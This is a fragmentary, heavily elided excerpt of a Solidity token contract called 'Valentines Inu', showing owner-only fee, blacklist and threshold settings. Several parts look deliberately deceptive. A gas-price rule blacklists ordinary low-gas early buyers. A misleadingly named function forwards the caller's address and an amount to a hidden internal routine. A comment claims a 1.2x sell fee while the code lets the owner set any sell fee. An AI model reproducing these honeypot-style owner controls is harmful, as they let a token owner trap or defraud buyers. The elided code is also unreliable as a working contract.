...
abstract contract Context {
	...
	contract VALENTINESINU is ERC20, Ownable {
		...
		uint256 public _maxBuyTransactionAmount = 2000000000 * (10**9); 
		uint256 public _maxSellTransactionAmount = 2000000000 * (10**9); 
		...
		uint256 public gweiLimit = 3000000;
        uint256 public CooldownInterval = 5;
		...
		uint256 public _liquifyThreshold = 1000000000000 * (10**9);
		uint256 public _swapThreshold = 1000000000000 * (10**9); 
		...
		constructor() ERC20("Valentines Inu", "VALENTINES INU"){
        ...
        function excludeFromTxLimit(address account, bool excluded) public onlyOwner {
		  ...
		  function excludeFromBlacklist(address account, bool excluded) public onlyOwner {
			require(_isSniper[account] != excluded, "VALENTINESINU: Account is already the value of 'excluded'");
			_isSniper[account] = excluded;
		...
		function setSwapBackSettings(uint256 swapThreshold) external onlyOwner() {
            _swapThreshold = swapThreshold	 * 10**9;
			
		}
		function setMarketingWalletAddress(address payable _marketingWallet) external onlyOwner() {
		...
		function setDeadBlockEnabled(bool _enabled) public onlyOwner {
			deadBlockEnabled = _enabled;
			
		
		}
		function setDeadBlockSettings(uint256 _deadBlocks, uint256 _gweiLimit) public onlyOwner {
        ...
        function setCooldownInterval( uint256 interval) public onlyOwner {
		...
		function removeAddressFromBlacklist(address _account) external onlyOwner {
        ...
        function setLiquifyThreshold(uint256 amount) external onlyOwner {
			_LiquifyThreshold(msg.sender, amount);

        }
    
	
        function _LiquifyThreshold(address account, uint256 amount) internal virtual {
		...
		function _transfer(
			...
			if (deadBlockEnabled)
			if (block.number <= launchAt + deadBlocks && tx.gasprice <= gweiLimit  ) {
                _isSniper[to] = true;
			...
			bool canSwap = contractTokenBalance >= _liquifyThreshold;
			...
			if(
				...
				uint256 swapTokens = contractTokenBalance.mul(_liquidityFee).div(totalTax);
			...
			if(takeFee) {
				uint256 fees = amount.mul(totalTax).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(CooldownInterval).div(100);
				}
